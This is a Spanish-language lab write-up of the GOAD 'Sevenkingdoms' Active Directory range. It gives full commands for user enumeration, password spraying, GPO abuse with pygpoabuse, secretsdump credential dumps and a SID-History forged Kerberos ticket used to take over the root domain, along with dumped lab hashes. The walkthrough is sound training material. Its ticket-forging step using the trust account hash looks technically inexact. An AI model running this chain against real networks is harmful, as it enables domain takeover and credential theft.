---
title: "GOAD Sevenkingdoms"
date: 2026-09-17 00:00:00 +0200
categories: [Writeups, GOAD]
tags: [active-directory, kerberos, password-spray, kerbrute, ldap-description-disclosure, bloodhound, gpo-abuse, golden-ticket, sid-history, cross-domain-trust, secretsdump, windows-server-2019]
---

**Dificultad:** Media
**Entorno:** Windows Server 2019 — bosque de dos dominios (`sevenkingdoms.local` raíz, `north.sevenkingdoms.local` hijo)
**Objetivo:** Partiendo de cero contra el bosque, comprometer primero el dominio hijo y usar la relación de confianza para escalar hasta Domain Admin del dominio raíz.

---

## Resumen

Este es el **GOAD clásico** de Orange Cyberdefense — la variante original con temática de Juego de Tronos, con un bosque de dos dominios: `sevenkingdoms.local` (raíz, DC `kingslanding`) y `north.sevenkingdoms.local` (hijo, DC `winterfell`, más un miembro `castelblack` con MSSQL).

La cadena de ataque completa:

1. **Enumeración de usuarios** con `kerbrute` sobre ambos dominios usando un diccionario de nombres de personajes de la serie.
2. **Password spray** trivial (usuario = contraseña) → `hodor:hodor` válido en el dominio hijo.
3. Con esa cuenta de bajísimo privilegio, **fuga de credenciales en el campo `description` de LDAP** → contraseña de `samwell.tarly` en texto plano, escrita ahí por error.
4. **BloodHound** revela que `samwell.tarly` puede convertirse en dueño de una GPO del dominio.
5. **Abuso de GPO** (toma de ownership + `GenericAll` + `pygpoabuse` sobre `ScheduledTasks.xml`) → admin local en `winterfell` (DC del dominio hijo).
6. `secretsdump` del DC hijo → hash de la cuenta de confianza `NORTH$`.
7. **Golden Ticket con SID History** (`ticketer.py` con `-extra-sid` apuntando a Enterprise Admins del dominio raíz) → salto de confianza padre-hijo.
8. `secretsdump` completo del NTDS del DC raíz (`kingslanding`) → **dominio raíz comprometido entero**.

`castelblack` (el miembro con MSSQL del dominio hijo) quedó sin comprometer — lo documento al final como cabo suelto, no como parte lograda de la cadena.

---

## Infraestructura

| Host | IP | Rol | Dominio |
|------|-----|-----|---------|
| winterfell | 10.6.6.11 | Domain Controller | north.sevenkingdoms.local |
| castelblack | 10.6.6.22 | Miembro, MSSQL (`sql_svc`) | north.sevenkingdoms.local |
| kingslanding | 10.6.6.10 | Domain Controller | sevenkingdoms.local (raíz) |

---

## Fase 1: Reconocimiento y acceso inicial

Descubrimiento de hosts con NetExec:

```bash
nxc smb 10.6.6.0/24 --generate-hosts-file hosts_goad
```

```
SMB   10.6.6.11   445   WINTERFELL     (domain:north.sevenkingdoms.local)
SMB   10.6.6.22   445   CASTELBLACK    (domain:north.sevenkingdoms.local)
SMB   10.6.6.10   445   KINGSLANDING   (domain:sevenkingdoms.local)
```

El dominio raíz está bien cerrado a nivel de null session — `ldapsearch`, `rpcclient` y `smbclient` anónimos contra `kingslanding` devuelven `STATUS_ACCESS_DENIED` sin excepción. Toca ir por fuerza bruta de usuarios con un diccionario temático (nombres de la serie) contra los dos dominios:

```bash
kerbrute userenum -d sevenkingdoms.local --dc 10.6.6.10 got_users.txt
kerbrute userenum -d north.sevenkingdoms.local --dc 10.6.6.11 got_users.txt
```

El dominio raíz confirma 4 usuarios (`cersei.lannister`, `tywin.lannister`, `jaime.lannister`, `joffrey.baratheon`); el hijo confirma 11 (`arya.stark`, `eddard.stark`, `jon.snow`, `samwell.tarly`, `hodor`...).

Un password spray trivial — cada usuario contra su propio nombre como contraseña — falla contra todos excepto uno:

```bash
nxc smb 10.6.6.11 -u north_users.txt -p north_users.txt --no-bruteforce --continue-on-success
```

```
[+] north.sevenkingdoms.local\hodor:hodor
```

`hodor` va a ser `hodor` hasta el final.

---

## Fase 2: La contraseña que estaba en el campo description

Con `hodor:hodor` ya se puede leer `NETLOGON`/`SYSVOL` por SMB, y lanzar un módulo de NetExec que vuelca el atributo `description` de todos los usuarios vía LDAP:

```bash
nxc ldap 10.6.6.11 -u hodor -p hodor -M get-desc-users
```

```
User: samwell.tarly   description: Samwell Tarly (Password : Heartsbane)
```

Ahí está — la contraseña de `samwell.tarly` escrita en texto plano en su propia descripción de AD. Confirmación:

```bash
nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
# [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
```

---

## Fase 3: BloodHound y abuso de GPO

```bash
bloodhound-python -u hodor -p hodor -d north.sevenkingdoms.local -ns 10.6.6.11 -c All --zip
```

> **Nota:** `bloodhound-python` (legacy) rompe con un `TypeError` al parsear ciertos atributos de tipo `filetime` negativo (`minPwdAge`) en versiones recientes de `ldap3`. Se soluciona fijando la versión: `pip install ldap3==2.9.1 --break-system-packages --force-reinstall`.

El grafo muestra que `samwell.tarly` puede tomar posesión de una GPO llamada **`StarkWallpaper`** (`CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local`), y desde ahí el camino sigue hasta comprometer el DC del dominio hijo y, cruzando la confianza de bosque, el DC raíz:

<figure>
<svg viewBox="0 0 600 760" role="img" aria-label="Ruta de ataque: desde hodor:hodor hasta el dominio raíz vía abuso de GPO y un ticket forjado con SID History que cruza la confianza padre-hijo" style="max-width:100%;height:auto;font-family:inherit;color:inherit">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <polygon points="0,0 10,5 0,10" fill="currentColor"/>
    </marker>
  </defs>

  <!-- box 1: hodor -->
  <rect x="60" y="20" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="1.5"/>
  <text x="300" y="46" text-anchor="middle" font-size="13" font-weight="600">hodor : hodor</text>
  <text x="300" y="64" text-anchor="middle" font-size="11" opacity="0.75">password spray (usuario = contraseña)</text>

  <line x1="300" y1="84" x2="300" y2="150" stroke="currentColor" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="316" y="121" font-size="11" opacity="0.85">fuga en atributo</text>
  <text x="316" y="134" font-size="11" opacity="0.85">LDAP description</text>

  <!-- box 2: samwell.tarly -->
  <rect x="60" y="150" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="1.5"/>
  <text x="300" y="176" text-anchor="middle" font-size="13" font-weight="600">samwell.tarly : Heartsbane</text>
  <text x="300" y="194" text-anchor="middle" font-size="11" opacity="0.75">contraseña en texto plano, en su propia ficha AD</text>

  <line x1="300" y1="214" x2="300" y2="280" stroke="currentColor" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="316" y="251" font-size="11" opacity="0.85">WriteOwner + GenericAll</text>

  <!-- box 3: GPO StarkWallpaper -->
  <rect x="60" y="280" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="1.5"/>
  <text x="300" y="306" text-anchor="middle" font-size="13" font-weight="600">GPO "StarkWallpaper"</text>
  <text x="300" y="324" text-anchor="middle" font-size="11" opacity="0.75">samwell.tarly ahora es su dueño</text>

  <line x1="300" y1="344" x2="300" y2="410" stroke="currentColor" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="316" y="374" font-size="11" opacity="0.85">pygpoabuse -&gt;</text>
  <text x="316" y="387" font-size="11" opacity="0.85">ScheduledTask</text>

  <!-- box 4: WINTERFELL -->
  <rect x="60" y="410" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="2"/>
  <text x="300" y="436" text-anchor="middle" font-size="13" font-weight="600">WINTERFELL — admin local</text>
  <text x="300" y="454" text-anchor="middle" font-size="11" opacity="0.75">DC de north.sevenkingdoms.local (hijo)</text>

  <line x1="300" y1="474" x2="300" y2="540" stroke="currentColor" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="316" y="504" font-size="11" opacity="0.85">secretsdump -&gt;</text>
  <text x="316" y="517" font-size="11" opacity="0.85">hash de NORTH$</text>

  <!-- trust boundary -->
  <line x1="20" y1="507" x2="580" y2="507" stroke="currentColor" stroke-width="1" stroke-dasharray="5,5" opacity="0.6"/>
  <text x="300" y="502" text-anchor="middle" font-size="10" opacity="0.7">confianza de bosque (SameForestTrust)</text>

  <!-- box 5: forged ticket -->
  <rect x="60" y="540" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="2" stroke-dasharray="3,3"/>
  <text x="300" y="566" text-anchor="middle" font-size="13" font-weight="600">Ticket forjado (Administrator)</text>
  <text x="300" y="584" text-anchor="middle" font-size="11" opacity="0.75">SID History: ExtraSid = Enterprise Admins del raíz</text>

  <line x1="300" y1="604" x2="300" y2="670" stroke="currentColor" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="316" y="634" font-size="11" opacity="0.85">secretsdump</text>
  <text x="316" y="647" font-size="11" opacity="0.85">(DRSUAPI)</text>

  <!-- box 6: KINGSLANDING -->
  <rect x="60" y="670" width="480" height="64" rx="8" fill="none" stroke="currentColor" stroke-width="2"/>
  <text x="300" y="696" text-anchor="middle" font-size="13" font-weight="600">KINGSLANDING — NTDS completo</text>
  <text x="300" y="714" text-anchor="middle" font-size="11" opacity="0.75">DC de sevenkingdoms.local (raíz) — dominio comprometido</text>
</svg>
<figcaption>Ruta real trazada con BloodHound: de una contraseña filtrada en un atributo LDAP hasta el dominio raíz, cruzando la confianza de bosque con un ticket Kerberos forjado (SID History).</figcaption>
</figure>

Con [bloodyAD](https://github.com/CravateRouge/bloodyAD):

```bash
bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
  set owner "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly

bloodyAD --host 10.6.6.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
  add genericAll "CN={C7F2AD8A-92E1-4507-A5B0-648A36E308A1},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local" samwell.tarly
```

Con `GenericAll` sobre la GPO, [pygpoabuse](https://github.com/Hackndo/pygpoabuse) inyecta una tarea programada que añade al propio usuario al grupo de administradores locales allí donde se aplique la GPO. La GPO ya traía un `ScheduledTasks.xml` propio, así que hace falta `-f` para añadir la tarea sin pisar la existente:

```bash
pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id C7F2AD8A-92E1-4507-A5B0-648A36E308A1 \
  -command 'net localgroup administrators samwell.tarly /add' \
  -dc-ip 10.6.6.11 -f
```

```
[+] ScheduledTask TASK_b9824f45 created!
```

Tras el próximo ciclo de refresco de GPO (o forzándolo), `samwell.tarly` es admin local del DC:

```bash
nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
# [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (admin)
```

---

## Fase 4: Dump del DC hijo y ataque de confianza (SID History)

Con admin en `winterfell`, `secretsdump` completo saca la NTDS del dominio hijo — incluida la cuenta de confianza `NORTH$`:

```bash
secretsdump.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.6.6.11
```

```
NORTH$:1105:aad3b435b51404eeaad3b435b51404ee:aaed1f8c12a6ff5b76a1903124b7363b:::
```

`NORTH$` es la cuenta de confianza que representa al dominio hijo dentro del bosque — y su NTLM es la clave para el ataque clásico de **SID History / confianza padre-hijo**. Con [ticketer.py](https://github.com/fortra/impacket) se forja un TGT para "Administrator" del dominio hijo, pero inyectando en el campo `SID History` el SID de **Enterprise Admins del dominio raíz** (`<SID-raíz>-519`):

```bash
ticketer.py -nthash aaed1f8c12a6ff5b76a1903124b7363b \
  -domain-sid S-1-5-21-221956006-502909763-1067390246 \
  -domain north.sevenkingdoms.local \
  -extra-sid S-1-5-21-2080356956-2684343819-452018693-519 \
  Administrator
```

El dominio raíz no valida por sí solo que ese SID Enterprise Admins pertenezca realmente al historial de una cuenta legítima — confía en el propio dominio hijo (relación de confianza transitiva del bosque), así que el ticket forjado es aceptado como si el "Administrator" del hijo perteneciera también al grupo Enterprise Admins del bosque entero.

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
```

Y ahí cae el dominio raíz completo:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5690a1ca2f11b3fce0f6e84e57c6da99:::
tywin.lannister:1113:...
jaime.lannister:1114:...
cersei.lannister:1115:...
tyron.lannister:1116:...
robert.baratheon:1117:...
...
```

Con el hash de `krbtgt` del dominio raíz en la mano, se puede forjar un Golden Ticket permanente para todo `sevenkingdoms.local`. Dominio raíz del bosque comprometido de principio a fin, partiendo de una cuenta cuya contraseña era literalmente su propio nombre.

---

## Lo que quedó sin resolver: castelblack

`castelblack` (10.6.6.22), el miembro del dominio hijo con MSSQL, nunca cayó. Varios intentos, todos fallidos por motivos distintos:

- `mssqlclient.py` con el hash de `Administrator` del dominio hijo vía `-windows-auth` → `Login failed. The login is from an untrusted domain` (autenticación integrada de Windows no cruza dominios sin Kerberos bien negociado).
- `getTGT.py` pidiendo un TGT normal con ese mismo hash → `KDC_ERR_PREAUTH_FAILED` (el hash NTLM capturado no correspondía realmente a esa cuenta en ese contexto, o el NTLM no es suficiente sin RC4 habilitado).
- Con el ticket forjado por SID History sí autentica el `Login failed` cambia a un mensaje distinto (`Login failed for user 'NORTH\Administrator'`), confirmando que se llega hasta la instancia, pero sin permisos de login SQL.
- `wmiexec.py`/`psexec.py` contra `castelblack` con el hash de `sql_svc` → error de `SVCManager` (`Unable to open SVCManager`) y recurso compartido no escribible.

Queda como trabajo pendiente para una segunda vuelta al lab.

---

## Técnicas utilizadas

| Técnica | Descripción |
|---------|-------------|
| Username enumeration | `kerbrute userenum` con diccionario temático contra ambos dominios |
| Password spray | Usuario = contraseña, revela `hodor:hodor` |
| LDAP description disclosure | Contraseña de `samwell.tarly` en texto plano en su propio atributo `description` |
| BloodHound (legacy) | Recolección LDAP para trazar la ruta de ataque |
| GPO abuse (ownership + GenericAll + ScheduledTask) | `bloodyAD` + `pygpoabuse` para conseguir admin local en el DC del dominio hijo |
| DCSync / NTDS dump | `secretsdump.py` contra el DC hijo, extracción de la cuenta de confianza `NORTH$` |
| SID History / Golden Ticket de confianza padre-hijo | `ticketer.py` con `-extra-sid` apuntando a Enterprise Admins del dominio raíz |
| NTDS dump del dominio raíz | Compromiso total del bosque tras el salto de confianza |

---

## Recursos

- [GOAD by Orange-Cyberdefense](https://github.com/Orange-Cyberdefense/GOAD)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [pygpoabuse — Hackndo](https://github.com/Hackndo/pygpoabuse)
- [kerbrute — ropnop](https://github.com/ropnop/kerbrute)
- [SID History / child-parent trust attack — harmj0y](https://harmj0y.medium.com/from-kekeo-to-rubeus-33c6f7683aa7)
